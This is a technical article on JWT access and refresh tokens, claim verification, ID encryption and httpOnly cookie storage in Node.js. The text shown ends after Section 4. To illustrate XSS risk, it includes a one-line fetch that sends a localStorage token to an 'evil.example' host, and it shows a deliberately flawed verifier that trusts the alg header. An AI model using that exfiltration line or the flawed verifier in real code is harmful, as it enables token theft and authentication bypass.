---
type: article
title: >-
  JWT Token, Refresh, Risk-Based Authentication (RBA), and OpenID Connect (OIDC)
  Best Practices
author: Philip A Senger
category: Security
tags:
  - jwt
  - refresh-token
  - risk-based-authentication
  - oidc
  - oauth
  - session-management
  - node
  - react
  - axios
  - security
description: >-
  Field-tested patterns for JWT access and refresh tokens, httpOnly cookie
  storage, rotation with reuse detection, risk-based step-up authentication, and
  the move to OIDC.
summary: >-
  A ground-up guide to session authentication in Node.js and React. Covers JWT
  anatomy and verification, cookie storage and CSRF, refresh token rotation and
  reuse detection, axios single-flight interceptors, risk-based authentication
  with device fingerprinting, and when to adopt OIDC, JWKS, and an external
  identity provider. Aligned to RFC 9700, RFC 8725, OWASP, and NIST SP
  800-63B-4, with citations throughout.
status: published
date_created: "2026-07-18"
date_updated: "2026-07-18"
mermaid_svg_source: base64-embedded
---

# JWT Token, Refresh, Risk-Based Authentication (RBA), and OpenID Connect (OIDC) Best Practices

A opinionated practical guide built on professional experience to building session authentication correctly, with worked examples in Node.js, React, and axios.

**Author:** Philip Senger

The patterns and code in this guide are drawn from deployed production grade Node.js and React authentication systems designed and written by the author many times. Identifiers have been genericized so the material is portable to any project.

## Who This Is For

You already know JavaScript. You've probably watched a few YouTube videos on JWTs, maybe even pasted one into jwt.io to see what's inside. But there's a real gap between an auth system that works and one that would hold up under an OWASP audit or bank-grade scrutiny. This document is for you if you've never built an auth system from scratch, or if you have and you're not fully confident it's right. Let's walk through the concepts that make the difference.

By the end, you'll understand what each piece does, why it exists, and what breaks if you get it wrong. This document builds step by step, each section depends on the one before it, so it's worth reading in order rather than jumping around. Every code sample here is safe to copy into production.

## Table of Contents

1. [Why Tokens At All](#1-why-tokens-at-all)
2. [Anatomy of an Access Token](#2-anatomy-of-an-access-token)
3. [Verifying a Token: The Checklist](#3-verifying-a-token-the-checklist)
4. [Where to Put the Token](#4-where-to-put-the-token)
5. [Refresh Tokens](#5-refresh-tokens)
6. [The Client Side: Axios Interceptors](#6-the-client-side-axios-interceptors)
7. [Risk-Based Authentication](#7-risk-based-authentication)
8. [How To: Practical Recipes](#8-how-to-practical-recipes)
9. [Common Mistakes](#9-common-mistakes)
10. [Beyond One Service: OIDC, Discovery, and Distributed Security](#10-beyond-one-service-oidc-discovery-and-distributed-security)
11. [Standards and References](#11-standards-and-references)
12. [Glossary](#12-glossary)

---

## 1. Why Tokens At All

### The problem

HTTP is stateless. Every request arrives with no memory of the last one. If a user logs in on request #1, request #2 has no idea who they are. Something has to carry identity forward.

### The old way: server-side sessions

The classic answer is a session table:

1. User logs in. Server creates a row: `session_id → user_id`.
2. Server sends back `session_id` in a cookie.
3. Every later request sends the cookie. Server looks up the row.

This works and it is not wrong. It has one real cost: **every request needs a database lookup**, and every server needs to reach the same session store. Scale to twenty API instances and that store becomes a bottleneck and a single point of failure.

### The token way

A token is a **self-describing** credential. Instead of a meaningless id that points at a row, the token itself says "this is user 42, issued at 10:00, expires at 10:05", and it carries a cryptographic signature proving the server wrote it.

The server can verify a token with nothing but a secret key. No database. No shared store. Any instance can verify any token.

### The catch, and it is a big one

You cannot un-issue a token.

A session row can be deleted; the next request fails instantly. A signed token is valid until it expires, because verification is pure math over the token's own bytes. There is no "check if still valid" step unless you add one, and adding one puts the database lookup right back.

**This single tradeoff drives every design decision in this document.** Everything that follows is a way of managing the consequences of tokens you cannot revoke.

The standard answer, which the rest of this guide builds out:

> Make the token you cannot revoke **short-lived**, so the damage window is small. Pair it with a longer-lived token that you *can* revoke, and use that one only to mint replacements.

That is the access token / refresh token split.

![flowchart diagram 1|622](flowchart-1.svg)

The access token is exposed constantly, so it must be cheap to lose. The refresh token is rarely exposed and tightly guarded, so it can live longer.

---

## 2. Anatomy of an Access Token

A JWT is three base64url-encoded chunks joined by dots ( the content is just an example to demonstrate the segments ):

```text
eyJhbGciOiJnR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLAiOjE3MDB9.4pOZd37848Xk2mQ
└──────── header ────────┘ └──────── payload ────────┘ └─ signature ─┘
```

**It is extremely important to understand, it is not encrypted.** Base64 is encoding, not encryption. Anyone holding the token can read the payload. Paste one into jwt.io and you will see every claim in plain text.

Say that again, because beginners get this wrong constantly: **a JWT is signed, not secret.** The signature proves nobody *changed* it. It does nothing to stop anyone *reading* it.

Let's break each section ( header, payload or claims, and signature ) into parts and dive deep.

### The header

```json
{ "alg": "HS256", "typ": "JWT" }
```

`alg` is the signing algorithm. `typ` is the token type. That is all you need.

### The payload: claims

A "claim" is just a key/value pair asserting something. The registered claims from [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) are the ones worth knowing:

| Claim | Name | What it means | Use it? |
|---|---|---|---|
| `iss` | Issuer | Who minted this token | Yes |
| `sub` | Subject | Who the token is about (the user id) | Yes |
| `aud` | Audience | Who the token is *for* | Yes |
| `exp` | Expiration | Reject on or after this time | **Always** |
| `iat` | Issued At | When it was minted | Yes |
| `nbf` | Not Before | Reject *before* this time | Situational |
| `jti` | JWT ID | Unique id for this specific token | On refresh tokens |

All times are **NumericDate**: seconds since the Unix epoch, not milliseconds.[^numericdate] Mixing up seconds and milliseconds is the single most common JWT bug. `Date.now()` gives milliseconds; you almost always want `Math.floor(Date.now() / 1000)`.

### What NOT to put in a payload

Since the payload is world-readable:

- **Never** put passwords, secrets, API keys, or card numbers in a token.
- **Avoid** PII: email, phone, legal name, address. A token in a log file is a data leak.
- **Think hard** before putting roles or permissions in the token. See the sidebar below.

### Sidebar: should roles go in the token?

This is a genuine fork in the road, and beginners are usually only shown one side.

**Roles in the token.** Verification is pure math. Zero database calls. Blazing fast.
The cost: the token is a **snapshot**. Fire someone, strip their admin role, and their existing token still says `admin` until it expires. You have handed out a credential you cannot correct.

**Roles looked up per request.** Every request costs one database read.
The benefit: revocation is **instant**. Change a role, and the very next request sees it.

Neither is wrong. Pick deliberately based on your access token TTL, because the TTL *is* your worst-case staleness window. Roles in a 5-minute token means at most 5 minutes of stale permissions, which is often fine. Roles in a 24-hour token is a liability.

The example system this guide draws from keeps **only `sub` in the token** and resolves roles from the database on every request, accepting the read in exchange for instant revocation.

> **If you take one thing from this section:** whatever you choose, write the reason down next to the code. The next developer will see a per-request database call and "optimize" it by moving roles into the token, silently breaking revocation, and nobody will notice until an ex-employee's token still works.

### Never put a raw database id in `sub`

`sub` identifies the user, so the obvious move is to drop your database primary key in it. Do not.

Go back to the first rule of this section: **the payload is world-readable.** A database id in `sub` is not stored in the token, it is *published* by it. Anyone holding the token, and anything that token touches, now knows your internal primary key.

That is worse than it sounds, because a raw id leaks more than the id:

- **It confirms the record exists.** The id is real by construction.
- **Sequential ids leak volume and ordering.** User `1042` tells an attacker roughly how many users you have and exactly who registered before them. Two tokens are a sample size.
- **It hands over a value to try everywhere else.** The moment a real id is in the client's hands, every endpoint taking an id is a candidate for IDOR. Your access checks are now the *only* thing standing between a curious user and someone else's record. They should not have to be the only thing.
- **MongoDB ObjectIds are worse than they look.** An ObjectId is not opaque. Its first 4 bytes are a **Unix timestamp**, so publishing one publishes the account's creation time. They are also semi-monotonic, which makes neighbors guessable. A value that looks like a random hex blob to a beginner is a structured, partially-predictable record locator.[^objectid]

So: **the real id never crosses the server boundary.** Two ways to hold that line.

**Encrypt it on the way out and decrypt on the way in.** The token carries ciphertext; your code still works with real ids internally:

```javascript
const clonedClaims = {
    ...claims,
    sub: encryptId( claims.sub ),
}
```

```javascript
// on the way back in, after the signature verifies
payload.sub = decryptId( payload.sub )
```

The rest of your application never knows this happened. `req.context.claim.sub` is a real id, the wire format is not, and the translation lives in exactly one place.

**Or give records a separate public identifier.** A `publicId` column holding a random UUIDv4, indexed, that is the only id ever exposed. No crypto, no key to manage, and it is what many teams reach for. The cost is a column, an index, and a lookup.

Either works. What does not work is shipping the primary key and hoping nobody looks.

Here is the encryption approach in full, applied at mint time:

```javascript
function encodeJwtPayload( claims ) {
    const header = {
        alg: 'HS256',
        typ: 'JWT',
    }
    if ( claims.sub === '' || claims.sub === null || claims.sub === undefined ) {
        throw new Error( 'Sub on claim can not be empty, or missing' )
    }
    const clonedClaims = {
        ...claims,
        sub: encryptId( claims.sub ),
    }
    const encodedHeader = base64UrlEncode( JSON.stringify( header ) )
    const encodedPayload = base64UrlEncode( JSON.stringify( clonedClaims ) )
    const encodedSignature = crypto
        .createHmac( hmacAlgorithm, jwtKey )
        .update( encodedHeader + '.' + encodedPayload )
        .digest( 'base64url' )
    return encodedHeader + '.' + encodedPayload + '.' + encodedSignature
}
```

The `createHmac` lines at the end are the signature step; the signature gets its own section below.

Two things about the key:

**Use a different key than your JWT signing key.** Signing and encryption are different jobs with different blast radii. One key doing both means one leak costs you both properties, and it forecloses ever rotating them independently. `AUTH_JWT_SIGNING_KEY` and `AUTH_ENTITY_ID_KEY`, from the environment, validated at boot, per Section 8.

**Rotating it logs everyone out**, because in-flight tokens carry ciphertext the new key cannot read. That is survivable for a 5-minute access token and worth knowing before you do it at 2pm on a Tuesday.

**This is a boundary, not a substitute.** Encrypting `sub` does not authorize anything. You still check permissions on every request exactly as if the id were public, because an attacker who obtains a valid token has a valid decryptable `sub` regardless. What it buys you is that your internal identifiers are not lying around in logs, proxy traces, error reports, browser history, and analytics payloads, waiting for the day someone finds an endpoint whose access check is weaker than it should be.

Do it because the raw id has no business leaving your server, not because it stops an attack on its own.

### Implementing `encryptId`: use AEAD and a fresh nonce

`encryptId` has been hand-waved so far. It matters enough to write out, because symmetric encryption has two requirements beginners routinely miss, and missing either one undoes the whole exercise.

**1. A fresh random nonce (IV) on every single call.**

Encrypt the same id twice with the same key and no nonce, and you get the same ciphertext twice. That is **deterministic encryption**, and it defeats the entire point: the ciphertext becomes a stable pseudonym for the user. An attacker correlates tokens across logs, sessions, and services by matching ciphertext, and never needs to decrypt anything. You have not hidden the identifier, you have renamed it.

A random nonce makes the output different every time, so two tokens for the same user look unrelated.

**2. Authenticated encryption (AEAD), meaning `aes-256-gcm`.**

Encryption hides content. It does **not** stop someone modifying it. Plain CBC mode is *malleable*: an attacker who can flip bits in the ciphertext can make predictable changes to the plaintext, and CBC has no way to notice. That is the family of bugs behind padding oracle attacks.

GCM is **authenticated**: it produces a tag alongside the ciphertext, and decryption **fails loudly** if either has been touched.

> In this particular design, the JWT signature already covers the whole payload including the ciphertext, and Section 3 verifies that signature *before* decrypting. So CBC would not actually be exploitable here. But that safety is a property of the call ordering, not of the encryption, and it quietly evaporates the day someone reuses `encryptId` somewhere without an outer signature. **Do not build on a guarantee you get by accident.** GCM carries its own integrity and costs nothing extra.

```javascript
const crypto = require( 'crypto' )

const ALGORITHM = 'aes-256-gcm'
const IV_LENGTH = 12    // 96 bits: the size GCM is designed for
const TAG_LENGTH = 16   // 128 bits

/**
 * Encrypts an internal id for transport in a JWT claim.
 * Output is non-deterministic: the same id encrypts differently every call.
 * @param {string} plainId - the real database id. Never leaves the server unencrypted.
 * @returns {string} base64url of iv || tag || ciphertext
 */
function encryptId( plainId ) {
    // A FRESH nonce every call. Never a constant, never derived from the id.
    const iv = crypto.randomBytes( IV_LENGTH )
    const cipher = crypto.createCipheriv( ALGORITHM, entityIdKey, iv )

    const ciphertext = Buffer.concat( [
        cipher.update( String( plainId ), 'utf8' ),
        cipher.final()
    ] )
    const tag = cipher.getAuthTag()

    // The iv and tag are NOT secret. They must travel with the ciphertext
    // or decryption is impossible. Pack them together.
    return Buffer.concat( [ iv, tag, ciphertext ] ).toString( 'base64url' )
}

/**
 * Reverses encryptId. Throws if the value was tampered with.
 * @param {string} encoded - base64url of iv || tag || ciphertext
 * @returns {string} the real database id
 */
function decryptId( encoded ) {
    const raw = Buffer.from( encoded, 'base64url' )

    // Reject anything too short to contain its own header before parsing it.
    if ( raw.length <= IV_LENGTH + TAG_LENGTH ) {
        throw UnAuthorizedError
    }

    const iv = raw.subarray( 0, IV_LENGTH )
    const tag = raw.subarray( IV_LENGTH, IV_LENGTH + TAG_LENGTH )
    const ciphertext = raw.subarray( IV_LENGTH + TAG_LENGTH )

    const decipher = crypto.createDecipheriv( ALGORITHM, entityIdKey, iv )
    decipher.setAuthTag( tag )

    // .final() THROWS if the tag does not verify. That throw is the integrity check.
    // Never swallow it.
    return Buffer.concat( [
        decipher.update( ciphertext ),
        decipher.final()
    ] ).toString( 'utf8' )
}
```

The rules that make this correct:

**Never reuse a nonce with the same key.** For GCM this is not "a bit weaker", it is **catastrophic**. Two messages under the same key and nonce leak the XOR of their plaintexts *and* the authentication subkey, which lets an attacker forge valid tags at will. It is the single worst mistake available in GCM and it is one line away: a hardcoded IV, an IV derived from the user id, or an IV you "cached for performance". `crypto.randomBytes(12)` per call, always.[^gcm-nonce]

**The IV and tag are not secrets.** Beginners hide them or, worse, drop them. They are inputs to decryption and must accompany the ciphertext. Prepending them is standard.

**Never use `crypto.createCipher`.** The one without `iv`. It takes no IV, derives the key with a weak non-standard KDF, and is deprecated and **removed in Node 22**.[^createcipher] If you find it in a codebase, it is a bug, not a style choice. Always `createCipheriv`.

**Let the tag failure throw.** A `catch` around `decipher.final()` that returns `null` converts "someone is tampering with this token" into "hmm, empty result". The throw *is* the security control. In Section 3 it lands in the verifier's `try/catch` and becomes a 401, which is exactly right.

**The key is 32 bytes for `aes-256-gcm`**, from the environment, validated at boot, and distinct from your signing key.

**The cost:** the token grows. A 24-character ObjectId becomes about 70 base64url characters after a 12-byte IV and 16-byte tag are added. Cookies are capped around 4KB[^cookie-size], so this is affordable, but it is not free.

**One thing this buys you that is easy to miss:** because the output is non-deterministic, you **cannot look up a user by their encrypted id.** That is correct here, since you always decrypt to get the real id. But it means you cannot store this ciphertext in a database column and query it. If you need that, you need a separate random `publicId` column, which is the other option above. Deterministic encryption would restore lookups and reintroduce the correlation problem, so it is rarely the answer.

### Separating token types with `typ`

If your access and refresh tokens are signed with the same key, they are interchangeable unless you distinguish them. Without a type marker, **a refresh token is a valid access token**, which quietly turns your carefully-guarded 48-hour credential into a 48-hour API pass.

Put a custom type claim in the payload and check it on every verify:

```javascript
const generateRefreshJwtClaim = ( { id, family } ) => {
    const iat = generateIat()
    const jti = generateJti()
    return _jwt( {
        id,
        family,
        ...generateType( 'ref' ),
        ...generateExp( iat, refreshJwtExpiryInSeconds ),
        ...generateNbf( iat, refreshJwtNotBeforeInSeconds ),
        ...iat,
        ...jti,
    } )
}
const generateJwtClaim = ( { id } ) => {
    const iat = generateIat()
    return _jwt( {
        id,
        ...generateType( 'reg' ),
        ...generateExp( iat, jwtExpiryInSeconds ),
        ...iat,
    } )
}
```

Two things to notice:

- The refresh token gets a **`jti`**, a unique id. The access token does not. That `jti` is your revocation handle. Section 5 explains why.
- The refresh token gets an **`nbf`**, so it cannot be used before the access token has expired. This is optional and mildly opinionated; it stops a client from burning through refreshes early.

Using separate signing keys per token type achieves the same separation and is arguably cleaner. Either works. Doing neither does not.

One naming note. This custom claim lives in the **payload** and happens to be called `typ`, while the JWT **header** also has a `typ` parameter (`JWT`). They are different fields doing different jobs. RFC 8725 formalizes the header-based version as "explicit typing"[^rfc8725-typ]; if the overlap bothers you, name the payload claim something like `token_use` instead. What matters is that the check runs on every verify.

The refresh token also carries a `family` id, set at login and copied to every descendant. Section 5 explains what it is for.

### The signature

The third chunk is the only one that is not readable data. It is an HMAC-SHA256 digest of `encodedHeader + "." + encodedPayload`, keyed with your signing key; the `createHmac` lines in `encodeJwtPayload` above are exactly this computation. Change one byte of either covered chunk and the signature no longer matches. That is the whole trick.

Note `digest( 'base64url' )`: the signature is base64url over the **raw digest bytes**. Encode the digest to base64 first and then base64url-encode the resulting *string* and you have double-encoded it. Your verifier will agree with your minter, and nothing else, including jwt.io, ever will.

Verification is the mirror image: recompute the digest from the token's own first two chunks and compare. Section 3 walks through it, including why that comparison must be constant-time.

#### HS256 or RS256?

| | HS256 (symmetric) | RS256 (asymmetric) |
|---|---|---|
| Keys | One shared secret | Private key signs, public key verifies |
| Anyone with the verify key can also **forge** | Yes | No |
| Good when | One service signs and verifies | Many services verify, one signs |

Start with **HS256**. Move to RS256 when a service needs to verify tokens without being trusted to mint them. Do not cargo-cult RS256 into a single-service app; you gain nothing and add key management.

Your signing key must be **long, random, and from the environment**:

```bash
AUTH_JWT_SIGNING_KEY=<32+ random bytes, hex or base64>
```

Never a default value in code. Never committed. Generate with `openssl rand -hex 32`. The 32-byte floor is not folklore: RFC 7518 requires HS256 keys of at least 256 bits, the size of the hash output.[^rfc7518] If this key leaks, an attacker mints tokens for any user, and you will not be able to tell the forgeries from the real ones.

### Use a library

Everything above shows you what is *inside* a JWT so the concepts are not magic. In production, **use a library**. [`jose`](https://github.com/panva/jose) is the current best choice for Node.

```javascript
import { SignJWT } from 'jose'

const secret = new TextEncoder().encode( process.env.AUTH_JWT_SIGNING_KEY )

const token = await new SignJWT( { typ: 'reg' } )
    .setProtectedHeader( { alg: 'HS256' } )
    .setIssuer( 'api.example.com' )
    .setAudience( 'web' )
    .setSubject( userId )
    .setIssuedAt()
    .setExpirationTime( '5m' )
    .sign( secret )
```

A library gives you constant-time signature comparison, correct base64url handling, clock-skew tolerance, and algorithm confusion protection, all for free and all already reviewed by people who do this for a living. Hand-rolling is a fine way to learn and a poor way to ship.

---

## 3. Verifying a Token: The Checklist

This is the highest-stakes function in your codebase. Get it wrong and everything else is decoration.

A correct verifier checks, **in this order**:

1. **Structure.** Exactly three dot-separated parts.
2. **Algorithm.** Matches what you expect, checked against your own constant.
3. **Signature.** Recomputed and compared.
4. **Claims.** `exp`, `iss`, `aud`, `nbf`, token type.

Order matters. Never trust a claim you have not verified the signature over.

### The `alg: none` attack

This is the classic JWT vulnerability, and it is worth understanding because it teaches the general lesson.

The JWT spec allows `alg: "none"`, meaning "unsigned". A naive verifier reads `alg` **from the token** and dispatches on it:

```javascript
// DANGEROUS - never do this
const { alg } = JSON.parse( base64UrlDecode( encodedHeader ) )
if ( alg === 'none' ) return payload          // attacker wins
return verifyWith( alg, encodedHeader, encodedPayload, signature )
```

The attacker edits the header to `{"alg":"none"}`, edits the payload to `{"sub":"admin"}`, drops the signature, and walks in. **The token told the verifier how to check the token.**

The general lesson, which applies far beyond JWTs: **never let untrusted input choose how it gets validated.** Pin the algorithm to a constant you control and reject anything else.[^rfc8725-alg]

The related attack is *algorithm confusion*: a server expecting RS256 is handed an HS256 token signed with the RSA **public** key. If the code naively "uses whatever `alg` says", it verifies an HMAC using a key that is, by design, public. Same root cause. Same fix.

### A correct verifier

```javascript
function decodeJwtPayload( token, checkFunctions = [] ) {
    const parts = token.split( '.' )
    if ( parts.length !== 3 ) {
        throw UnAuthorizedError
    }
    const [encodedHeader, encodedPayload, providedSignature] = parts
    const header = JSON.parse( base64UrlDecode( encodedHeader ) )
    const { alg, typ } = header
    if ( alg !== 'HS256' ) {
        throw UnAuthorizedError
    }
    if ( typ !== 'JWT' ) {
        throw UnAuthorizedError
    }
    const payload = JSON.parse( base64UrlDecode( encodedPayload ) )
    const expectedSignature = crypto
        .createHmac( hmacAlgorithm, jwtKey )
        .update( encodedHeader + '.' + encodedPayload )
        .digest( 'base64url' )
    if ( !timingSafeCompare( providedSignature, expectedSignature ) ) {
        throw UnAuthorizedError
    }

    checkFunctions.forEach( ( fn ) => fn( payload ) )

    return { header, payload }
}
```

Note `alg !== 'HS256'` compares against a **hardcoded constant**, not against anything derived from the token. That one line is the entire `alg: none` defense.

### Compare signatures in constant time

```javascript
const crypto = require( 'crypto' )

function timingSafeCompare( a, b ) {
    const bufA = Buffer.from( a )
    const bufB = Buffer.from( b )
    if ( bufA.length !== bufB.length ) {
        return false
    }
    return crypto.timingSafeEqual( bufA, bufB )
}
```

`!==` on strings short-circuits at the first differing character. An attacker who can measure response times precisely can, in principle, recover a signature byte by byte. Over the public internet this is largely theoretical, drowned in network jitter. On a local network or a shared host it is not. `crypto.timingSafeEqual` always compares the full length. The length check before it is necessary because `timingSafeEqual` throws on mismatched lengths.[^timingsafeequal]

This is exactly the kind of detail a library handles for you.

### Composable claim checks

Signature verified, so the payload is now trustworthy. But "trustworthy" only means *we* wrote it. It does not mean it is still valid, or that it was meant for us. That is what claim checks are for.

Access tokens and refresh tokens need *different* checks. The tempting move is two big verify functions with a lot of copy-paste between them, which drift apart the moment someone fixes a bug in one and forgets the other. Instead, make each check a small function and compose a list.

#### A check is just a function that throws

That is the entire contract:

```javascript
/**
 * A check receives the decoded payload.
 * Returns nothing if the claim is acceptable.
 * Throws if it is not.
 */
function restrictExpiry( payload ) {
    const now = Math.floor( Date.now() / 1000 )

    if ( typeof payload.exp !== 'number' ) {
        throw UnAuthorizedError
    }
    // exp is "on and after which the token MUST NOT be accepted".
    // The leeway is ADDED: it forgives a verifier clock running fast.
    // It never shortens the token's life.
    if ( now >= payload.exp + CLOCK_SKEW_LEEWAY_SECONDS ) {
        throw UnAuthorizedError
    }
}
```

No return value. It either says nothing (pass) or throws (fail). Since our verifier already runs inside a `try/catch` that maps any throw to a 401, a check has nothing to do but throw. **It cannot accidentally return a truthy value and let a bad token through**, which is exactly the sort of mistake a `return true/false` design invites.

`typeof payload.exp !== 'number'` is not busywork. A token with **no** `exp` at all would otherwise sail through: `now >= undefined` is `false`, so a missing expiry would read as "not expired", and you would have minted an immortal token. **A missing claim must fail, never default to pass.**

`CLOCK_SKEW_LEEWAY_SECONDS` (30 to 60 is typical) exists because your servers' clocks disagree. Without leeway, a token minted on a box running 5 seconds fast is briefly "issued in the future" on another box, and users see random 401s that never reproduce.

Mind the direction of the leeway on each claim. For `exp` it is **added**: a verifier whose clock runs fast must not reject a token that is still valid everywhere else. For `nbf` it is **subtracted**: a verifier whose clock runs slow must not reject a token that is already valid. Get a sign backwards and you silently shorten, or extend, every token's life by the leeway. Libraries expose this as a single `clockTolerance` option and apply the directions for you.

The rest follow the same shape:

```javascript
function restrictIssuer( payload ) {
    if ( payload.iss !== EXPECTED_ISSUER ) {
        throw UnAuthorizedError
    }
}

function restrictAudience( payload ) {
    if ( payload.aud !== EXPECTED_AUDIENCE ) {
        throw UnAuthorizedError
    }
}

function restrictIssuedAt( payload ) {
    const now = Math.floor( Date.now() / 1000 )
    if ( typeof payload.iat !== 'number' ) {
        throw UnAuthorizedError
    }
    // Issued in the future means someone's clock is wrong, or the token is forged.
    if ( payload.iat > now + CLOCK_SKEW_LEEWAY_SECONDS ) {
        throw UnAuthorizedError
    }
}

function restrictNotBefore( payload ) {
    const now = Math.floor( Date.now() / 1000 )
    // nbf is optional. Absent means "valid immediately".
    if ( payload.nbf === undefined ) {
        return
    }
    if ( typeof payload.nbf !== 'number' ) {
        throw UnAuthorizedError
    }
    if ( now < payload.nbf - CLOCK_SKEW_LEEWAY_SECONDS ) {
        throw UnAuthorizedError
    }
}
```

Note `restrictNotBefore` treats a **missing** `nbf` as a pass while `restrictExpiry` treats a missing `exp` as a fail. That asymmetry is deliberate and worth understanding: `nbf` is genuinely optional in the spec[^rfc7519-exp], and absent means "no start restriction". `exp` is the entire basis of the short-lived-token design, so a token without one is broken by definition.

**Optional means absent is fine. Required means absent is fatal. Decide which each claim is, explicitly.**

#### A factory for the near-identical checks

`restrictToRegularJwtType` and `restrictToRefreshJwtType` differ only in the string they compare. Rather than write it twice, write a function that *builds* checks:

```javascript
/**
 * Builds a check that enforces a specific token type.
 * @param {string} expectedType - the required `typ` claim, e.g. 'reg' or 'ref'
 * @returns {Function} a check function
 */
function restrictJwtType( expectedType ) {
    return function checkJwtType( payload ) {
        if ( payload.typ !== expectedType ) {
            throw UnAuthorizedError
        }
    }
}

const restrictToRegularJwtType = restrictJwtType( 'reg' )
const restrictToRefreshJwtType = restrictJwtType( 'ref' )
```

If the returned-function-from-a-function move is new to you, this is a **closure**. `restrictJwtType('reg')` runs immediately and hands back a *new function*. That new function remembers `expectedType === 'reg'` forever, even though `restrictJwtType` finished executing long ago. Call it later with a payload and it compares against `'reg'`.

So `restrictToRegularJwtType` and `restrictToRefreshJwtType` are two separate functions, built from one piece of logic, each permanently carrying its own expected value. Fix a bug in the comparison and both are fixed. That is the payoff.

#### Composing the list

```javascript
/**
 * Builds a complete verifier from a list of checks.
 * @param {Array<Function>} checkFunctions - checks to run, in order
 * @returns {Function} a verifier taking a raw token string
 */
function composeJwtChecks( checkFunctions ) {
    return function verifyToken( token ) {
        return decodeJwtPayload( token, checkFunctions )
    }
}
```

Another closure: it captures the list of checks and returns a ready-to-use verifier. `decodeJwtPayload` (shown above) does the structural work, pins the algorithm, verifies the signature, and only then runs your checks:

```javascript
checkFunctions.forEach( ( fn ) => fn( payload ) )
```

**Order is the security property here.** The checks run *after* the signature is verified, never before. Reading `exp` from an unverified payload would be trusting an attacker's arithmetic.

`forEach` with throwing checks gives you short-circuit behavior for free: the first failure throws out of the whole loop, and remaining checks never run. You do not need to collect errors. There is exactly one outcome that matters, and it is "no".

#### The payoff

```javascript
const decodeJwtPayloadAndValidate = composeJwtChecks( [
    restrictIssuer,
    restrictAudience,
    restrictExpiry,
    restrictIssuedAt,
    restrictToRegularJwtType,
] )

const decodeRefreshJwtPayloadAndValidate = composeJwtChecks( [
    restrictIssuer,
    restrictAudience,
    restrictExpiry,
    restrictIssuedAt,
    restrictNotBefore,
    restrictToRefreshJwtType,
] )
```

Each is a complete verifier. Call it with a token string; get `{ header, payload }` back or a thrown `UnAuthorizedError`:

```javascript
const { payload } = decodeJwtPayloadAndValidate( req.cookies.accessToken )
```

Now look at what the two lists tell you. The difference between them **is** the difference between the token types, and you can read it in two seconds:

- Both check issuer, audience, expiry, and issued-at.
- Only refresh checks `nbf` (it cannot be used early).
- They demand different `typ` values, so **a refresh token cannot be used as an access token**.

That legibility is itself a security property. A reviewer confirms the access path enforces `restrictToRegularJwtType` at a glance. Bury the same logic in a hundred-line function with nested conditionals and nobody will ever confirm it, and "nobody ever confirms it" is where the bug lives.

Each check is also trivially unit-testable in isolation, with no HTTP, no mocking, no token:

```javascript
expect( () => restrictExpiry( { exp: nowInSeconds() - 1 } ) ).toThrow()
expect( () => restrictExpiry( { exp: nowInSeconds() + 300 } ) ).not.toThrow()
expect( () => restrictExpiry( {} ) ).toThrow()   // missing exp must fail
```

Adding a new rule later means writing one small function and adding one line to a list. **This is the shape to reach for whenever you have a set of independent rules over one input**: small functions with a uniform contract, composed as data.

### Wiring it into Express

```javascript
return async function validateJwtAccessMiddleware( req, res, next ) {
    try {
        if ( !req?.cookies?.accessToken ) {
            return next( UnAuthorizedError )
        }
        const token = req.cookies.accessToken
        const { payload } = decodeJwtPayloadAndValidate( token )
        req.context.claim = payload
        next()
    } catch ( error ) {
        return next( UnAuthorizedError )
    }
}
```

Two habits worth copying:

- **Fail closed.** Every path that is not a successful verify calls `next(UnAuthorizedError)`. There is no path where an exception results in the request continuing.
- **One error for everything.** Expired, malformed, bad signature, missing: all return the same `UnAuthorizedError`. Do not tell an attacker *why* their token failed. "Signature invalid" versus "token expired" is a free oracle for probing your system.

Apply it once, at the root of your protected routes, not per-route:

```javascript
// routes/secure/_middleware.js  -  covers EVERY route beneath this directory
return [
    validateJwtMiddlewareFactory(),
    validateUserMiddlewareFactory(),
]
```

**Auth you have to remember to apply is auth you will forget to apply.** Structure your routes so that protection is the default and exposure is the deliberate act. A new file dropped into `secure/` is protected because of where it lives, not because someone remembered.

---

## 4. Where to Put the Token

You have a token. Where does it live in the browser?

This decision matters more than almost anything else on this list, and the most popular tutorial answer is the wrong one.

### The options

| Storage | Readable by JavaScript | Survives reload | Sent automatically |
|---|---|---|---|
| `localStorage` | **Yes** | Yes | No |
| `sessionStorage` | **Yes** | Per-tab | No |
| JS variable | **Yes** | No | No |
| **httpOnly cookie** | **No** | Yes | Yes |

### Why not localStorage

`localStorage` is readable by **any JavaScript running on your page**. Not just yours. Any.

That includes: a compromised npm dependency, an analytics snippet, a browser extension, and any XSS hole you have not found yet. All of it is one line away from your token:

```javascript
// Any script on your origin can do this. Including one you did not write.
fetch( 'https://evil.example/steal?t=' + localStorage.getItem( 'token' ) )
```

Modern apps ship hundreds of transitive dependencies. You are not auditing all of them. Assume that one day, one of them is hostile.

An **httpOnly** cookie is invisible to JavaScript. `document.cookie` does not show it. There is no API that returns it. The browser attaches it to outgoing requests and your JS never touches it. When the XSS happens, and eventually it does, the attacker can *make requests as the user* while the page is open, which is bad. But they cannot **steal the token itself** and use it from their own machine, next week, from another country. That difference is the whole game: incident versus breach.

> **Rule: session tokens go in httpOnly cookies. There is no good reason to put them in localStorage.**[^owasp-session]

The usual objection is "but I need the token to put in the Authorization header". You do not. That is the point of the next section.

### Setting the cookie correctly

```javascript
const _setCookie = ( res, cookieType, value, expires ) => {
    const cookieName = getCookieName( cookieType )
    const path = getCookiePath( cookieType )
    const cookieOptions = {
        path,
        secure: true,
        httpOnly: true,
        sameSite: 'strict'
    }

    if ( cookieType.isOpaqueToken() ) {
        cookieOptions.maxAge = expires * 1000   // a TTL: Express maxAge is milliseconds
    } else {
        cookieOptions.expires = new Date( expires * 1000 )  // an absolute epoch-seconds expiry
    }

    res.cookie( cookieName, value, cookieOptions )
}
```

Every flag earns its place:

| Flag | What it does | What breaks without it |
|---|---|---|
| `httpOnly: true` | JS cannot read it | XSS steals the token |
| `secure: true` | HTTPS only | Token sent in cleartext over HTTP |
| `sameSite: 'strict'` | Not sent on cross-site requests | CSRF |
| `path` | Only sent to matching paths | Token sent where it is not needed |
| `expires` | Browser drops it at expiry | Cookie outlives the token |

Note `new Date( expires * 1000 )`: the JWT `exp` claim is in **seconds**, and the `Date` constructor wants **milliseconds**. The cookie should expire exactly when the token does. Leave them out of sync and the browser cheerfully sends a token the server rejects, so the user sees mystery logouts.

